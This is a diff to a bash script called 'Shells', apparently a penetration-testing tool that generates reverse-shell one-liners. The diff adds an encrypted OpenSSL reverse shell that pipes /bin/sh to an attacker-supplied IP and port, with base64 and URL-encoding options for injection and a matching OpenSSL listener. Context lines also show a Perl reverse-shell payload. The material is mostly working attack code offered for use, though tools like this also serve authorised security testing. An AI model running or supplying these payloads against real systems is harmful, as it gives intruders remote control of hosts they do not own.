@@ -1,7 +1,10 @@
 #!/bin/bash
 #By Andreas Finstad - 4ndr34z
-#Twitter handle: @4nqr34z
-#Shells v.1.3.1
+#Twitter: @4nqr34z
+#Mastadon: 4ndr34z@infosec.exchange
+#Web: https://f20.be
+
+#Shells v.1.3.2
 
 ### Colors ##
 ESC=$(printf '\033') RESET="${ESC}[0m" BLACK="${ESC}[30m" RED="${ESC}[31m"
@@ -464,6 +467,35 @@ listen
 
 
 
+function open_s () {
+header
+#echo "Generating certificate..."
+openssl req -x509 -newkey rsa:4096 -keyout /tmp/k.pem -out /tmp/c.pem -days 365 -nodes -subj "/C=US/ST=*/L=*/O=*/CN=shells.com"
+rev="mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $IP:$PORT > /tmp/s; rm /tmp/s"
+
+if [[ $1 == "url" ]] 
+then
+    rev=$(urlencodeme "$rev")
+elif [[ $1 == "urlx2" ]] 
+then
+    rev=$(urlencodeme "$rev")
+    rev=$(urlencodeme "$rev")
+
+elif [[ $1 == "base64" ]] 
+then
+    rev=$(echo -n $rev|$benc --base64url -w0)
+fi
+if [[ $OS == "Darwin" ]]
+then
+   echo -n $rev | pbcopy
+else 
+    echo -n $rev | xclip -sel c
+fi
+listen "" "open_s"
+}
+
+
+
 function perl () {
 header
 rev="perl -e 'use Socket;\$i=\"$IP\";\$p=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"sh -i\");};'"
@@ -637,7 +669,7 @@ printf "\n\n"
 $(blueprint 'Listener')
 $(greenprint '1)') rlwrap netcat $1
 $(greenprint '2)') netcat $1
-$(greenprint '3)') no listener
+$(greenprint '3)') OpenSSL
 $(magentaprint 'm)') Go Back to Main Menu
 $(redprint '0)') Exit
 Choose an option [1]:  "
@@ -693,8 +725,11 @@ fi
         
         ;;
     3)
-        exit
+        echo
+        echo "Listening on port: $PORT"
+        openssl s_server -quiet -key /tmp/k.pem -cert /tmp/c.pem -port "$PORT"
         ;;
+   
     m)
         mainmenu
         ;;
@@ -1031,6 +1066,45 @@ Choose an option:  "
     esac
 }
 
+submenu_open_s() {
+header
+    echo -ne "
+$(blueprint 'OpenSSL')
+$(greenprint '1)') No encoding
+$(greenprint '2)') Base64 encoded
+$(greenprint '3)') URL encoded
+$(greenprint '4)') Double URL encoded
+$(magentaprint 'm)') Go Back to Main Menu
+$(redprint '0)') Exit
+
+Choose an option:  "
+    read -r -n 1 ans
+    case $ans in
+    1)
+        open_s 
+        ;;
+    2)
+        open_s "base64"
+        ;;
+    3)
+        open_s "url"
+        ;;
+    4)
+        open_s "urlx2"
+        ;;
+    m)
+        mainmenu
+        ;;
+    0)
+        fn_bye
+        ;;
+    
+    *)
+        fn_fail
+        ;;
+    esac
+}
+
 submenu_netcat() {
 header
     echo -ne "
@@ -1185,12 +1259,13 @@ $(greenprint '6)') Perl
 $(greenprint '7)') Telnet
 $(greenprint '8)') Zsh
 $(greenprint '9)') PHP
-$(greenprint 'a)') awk
+$(greenprint '10)') awk
+$(greenprint '11)') OpenSSL
 $ngrok_choice
 $(redprint '0)') Exit
 
 Choose an option:  "
-    read -r -n 1 ans
+    read -r -n 2 ans
     case $ans in
     1)
         input
@@ -1228,9 +1303,13 @@ Choose an option:  "
         input
         submenu_php
         ;;
-    a)
+    10)
         input
         submenu_awk
+        ;;
+    11)
+        input
+        submenu_open_s
         ;;
     n)
         input "ngrok"
